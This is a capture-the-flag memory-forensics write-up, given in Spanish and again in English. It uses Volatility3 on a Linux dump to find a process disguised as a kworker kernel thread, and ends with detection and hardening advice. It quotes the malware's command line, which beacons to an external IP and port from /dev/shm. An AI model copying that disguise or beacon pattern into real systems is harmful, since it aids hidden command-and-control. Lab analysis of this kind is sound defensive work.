Objetivo

Se ha volcado la memoria de un servidor Linux comprometido. Localiza el proceso que se hace pasar por un hilo del kernel y no lo es.

Nota sobre este volcado de memoria

Este es un volcado de memoria física real, de un kernel Linux (Debian 6.1) arrancado específicamente para este laboratorio en una VM mínima — no es texto plano simulado. Es pequeño (unos 15 MB comprimidos, frente a los varios GB de un volcado de producción) porque la VM se diseñó con el mínimo de RAM necesario para arrancar, pero las estructuras internas del kernel son 100% genuinas: volatility3 lo analiza exactamente igual que analizaría un volcado real, con los mismos plugins (linux.pslist, linux.psaux, etc.). Volatility3 puede leer el .raw.xz directamente sin descomprimir, pero al no ser un formato con acceso aleatorio, cada lectura no secuencial reprocesa el stream desde el principio — cada plugin puede tardar varios minutos así. Descomprime primero con unxz -k (ver Inicio rápido) y el mismo análisis tarda segundos.

Inicio rápido

unzip memdump_server01_hacklabs.zip
unxz -k memdump_server01.raw.xz
vol --symbol-dirs . -f memdump_server01.raw linux.pslist

1 · Por qué funciona

Volatility3 no "adivina" dónde está cada proceso en el volcado: recorre las estructuras reales del kernel (task_struct y compañía) siguiendo sus offsets exactos. Para saber esos offsets necesita una tabla de símbolos (ISF) que coincida con la build exacta del kernel volcado — por eso el paquete de evidencia incluye, además del volcado, un fichero .json.xz con esa tabla generada específicamente para este kernel (Debian 6.1.0-52-amd64) con dwarf2json.

2 · Descomprimir e indicar los símbolos

unzip memdump_server01_hacklabs.zip
ls
# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
unxz -k memdump_server01.raw.xz
ls
# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz

No hace falta mover nada a la carpeta de símbolos de Volatility3 (~/.cache/volatility3/symbols/): basta con apuntar --symbol-dirs a la carpeta donde has descomprimido el zip, y Volatility3 encontrará el .json.xz automáticamente por su banner.

Descomprime también el volcado antes de analizarlo. Volatility3 sabe leer .raw.xz directamente, pero xz no es un formato de acceso aleatorio: cada lectura no contigua que hace un plugin (localizar task_struct, seguir punteros dispersos por toda la RAM…) obliga a reprocesar el stream comprimido, y cada ejecución puede tardar varios minutos. Descomprimiendo una vez con unxz -k (la copia .xz se conserva por el flag -k), el mismo análisis pasa de minutos a segundos.

3 · Listar los procesos

vol --symbol-dirs . -f memdump_server01.raw linux.pslist

Verás decenas de hilos de kernel legítimos (kworker/0:0, ksoftirqd/0, rcu_gp… todos con PPID 2, hijos de kthreadd) y, al final, un puñado de procesos de "espacio de usuario": sshd, cron, rsyslogd, systemd-journal — y uno más, kworker/u4:2, que por su nombre parecería un hilo de kernel más.

4 · Detectar la anomalía con psaux

vol --symbol-dirs . -f memdump_server01.raw linux.psaux

Aquí está la clave: un hilo de kernel genuino no tiene ni ejecutable ni línea de comandos real — psaux lo muestra entre corchetes, repitiendo el nombre (p.ej. [kworker/0:1]), porque no hay ningún argv que mostrar. Compáralo con nuestro sospechoso:

86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}

Este proceso sí tiene un ejecutable real (/dev/shm/.systemd/kworker — una ruta que ningún hilo de kernel usaría jamás) y una línea de comandos completa con una IP y puerto externos: un patrón de beacon C2 clásico, disfrazado con un nombre que un análisis superficial con ps/top pasaría por alto sin pensarlo dos veces.

5 · Capturar la flag

vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL
HL{···}

Mitigación

  • Detección basada en eBPF (Falco, Tetragon) o auditd que alerte sobre ejecuciones desde rutas de escritura típicas de malware (/dev/shm, /tmp, /var/tmp).
  • Montar /dev/shm y /tmp con noexec cuando el diseño del sistema lo permita.
  • Alertar sobre procesos cuyo nombre imita el patrón de un hilo de kernel (kworker/*, ksoftirqd/*…) pero que tienen PPID distinto de 2 o un /proc/PID/exe válido — ningún hilo de kernel real tiene ninguna de las dos cosas.

Herramientas

Volatility 3 dwarf2json QEMU

1 · Why it works

Volatility3 doesn't "guess" where each process sits in the dump: it walks the kernel's real structures (task_struct and friends) following their exact offsets. To know those offsets it needs a symbol table (ISF) matching the exact kernel build that was dumped — that's why the evidence bundle includes, alongside the memory dump, a .json.xz file with that table, generated specifically for this kernel (Debian 6.1.0-52-amd64) with dwarf2json.

2 · Unzip and point at the symbols

unzip memdump_server01_hacklabs.zip
ls
# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
unxz -k memdump_server01.raw.xz
ls
# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz

No need to move anything into Volatility3's symbol cache (~/.cache/volatility3/symbols/): just point --symbol-dirs at the folder where you unzipped the bundle, and Volatility3 will find the .json.xz automatically by its banner.

Decompress the dump too before analyzing it. Volatility3 can read .raw.xz directly, but xz isn't a random-access format: every non-contiguous read a plugin does (locating task_struct, following pointers scattered across RAM…) forces it to reprocess the compressed stream, and a single run can take several minutes. Decompress once with unxz -k (the -k flag keeps the .xz copy too) and the same analysis drops from minutes to seconds.

3 · List the processes

vol --symbol-dirs . -f memdump_server01.raw linux.pslist

You'll see dozens of legitimate kernel threads (kworker/0:0, ksoftirqd/0, rcu_gp… all with PPID 2, children of kthreadd) and, at the end, a handful of "userspace" processes: sshd, cron, rsyslogd, systemd-journal — and one more, kworker/u4:2, which by its name would look like just another kernel thread.

4 · Spot the anomaly with psaux

vol --symbol-dirs . -f memdump_server01.raw linux.psaux

Here's the tell: a genuine kernel thread has no real executable or command line — psaux shows it in brackets, just repeating the name (e.g. [kworker/0:1]), because there's no argv to show. Compare it to our suspect:

86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}

This process does have a real executable (/dev/shm/.systemd/kworker — a path no genuine kernel thread would ever use) and a full command line with an external IP and port: a classic C2 beacon pattern, disguised behind a name a quick glance at ps/top would skip right past.

5 · Capture the flag

vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL
HL{···}

Mitigation

  • eBPF-based detection (Falco, Tetragon) or auditd alerting on executions from typical malware-writable paths (/dev/shm, /tmp, /var/tmp).
  • Mount /dev/shm and /tmp with noexec where the system design allows it.
  • Alert on processes whose name mimics the kernel-thread naming pattern (kworker/*, ksoftirqd/*…) but that have a PPID other than 2, or a valid /proc/PID/exe — a real kernel thread has neither.

Tools
